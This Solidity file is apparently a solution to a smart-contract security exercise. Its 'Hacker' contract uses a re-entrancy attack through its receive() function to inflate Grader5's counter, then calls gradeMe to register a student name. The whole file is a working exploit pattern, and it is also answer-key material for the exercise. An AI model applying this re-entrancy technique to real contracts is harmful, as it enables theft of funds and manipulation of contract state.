// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/**
 * @title IGrader
 * @dev Interface for the Grader5 contract, defining the external functions we need to interact with.
 */
interface IGrader {
    /**
     * @dev External function to interact with the Grader5's retrieve logic.
     * It's payable as it requires Ether.
     */
    function retrieve() external payable;

    /**
     * @dev External function to call Grader5's gradeMe, which registers a student's name.
     * @param name The name to be registered.
     */
    function gradeMe(string calldata name) external;

    /**
     * @dev Public view function to check the 'counter' mapping in Grader5.
     * @param _address The address for which to query the counter value.
     * @return The uint256 value of the counter for the given address.
     */
    function counter(address _address) external view returns (uint256);
}

/**
 * @title Hacker
 * @dev A contract designed to exploit the re-entrancy vulnerability in the Grader5 contract's `retrieve` function
 * to satisfy the `counter[msg.sender] > 1` requirement for `gradeMe`.
 * This contract acts as the `msg.sender` for the Grader5 contract.
 */
contract Hacker {
    IGrader public graderContract;
    // @dev A flag to control the re-entrancy flow and prevent infinite loops.
    //      Ensures the nested `retrieve` call happens only once per `hackAndGrade` execution.
    bool private reEntered = false;

    /**
     * @dev Constructor for the Hacker contract.
     * @param _graderAddress The address of the Grader5 contract instance to be targeted.
     */
    constructor(address _graderAddress) {
        graderContract = IGrader(_graderAddress);
    }

    /**
     * @dev Fallback/Receive function of this contract.
     * This function is automatically triggered when Ether is sent to this contract.
     * It performs the crucial re-entrant call to `Grader5.retrieve()` to manipulate the counter state.
     * It must be `external payable` to receive Ether.
     */
    receive() external payable {
        // Only re-enter if this is the first re-entry attempt within the current transaction.
        // This prevents an infinite loop as Grader5's retrieve also sends Ether back.
        if (!reEntered) {
            reEntered = true; // Set the flag to true to block further re-entries.

            // This is the second call to Grader5.retrieve().
            // At this point, Grader5.counter[address(this)] is 1 (from the initial call
            // that triggered this receive function).
            // This call increments it to 2. Critically, since 2 is NOT < 2, the counter
            // will NOT be reset to 0 by Grader5's internal logic, leaving it at 2.
            graderContract.retrieve{value: 4 wei}();
        }
    }

    /**
     * @dev Initiates the hack by performing the initial call to `Grader5.retrieve()`,
     * which triggers the re-entrancy, and then immediately calls `Grader5.gradeMe()`.
     * @param _name The student name to be registered in the Grader5 contract.
     * @notice Requires at least 8 wei to cover the cost of two `retrieve` calls (4 wei each).
     */
    function hackAndGrade(string calldata _name) external payable {
        // Ensure enough Ether is provided for both retrieve calls (initial and re-entrant).
        require(msg.value >= 8 wei, "Need at least 8 wei for retrieve calls.");

        // Reset the reEntered flag for a fresh execution, in case this function is called multiple times.
        reEntered = false;

        // Perform the first call to Grader5.retrieve().
        // This call will send 1 wei back to this Hacker contract,
        // which will activate the `receive()` function and the re-entrancy logic.
        // After this call (and the nested re-entrant call) completes,
        // Grader5.counter[address(this)] will be 2.
        graderContract.retrieve{value: 4 wei}();

        // With Grader5.counter[address(this)] now set to 2 (due to re-entrancy),
        // we can now successfully call Grader5.gradeMe().
        // The `msg.sender` for Grader5.gradeMe will be the address of this Hacker contract.
        graderContract.gradeMe(_name);
    }
}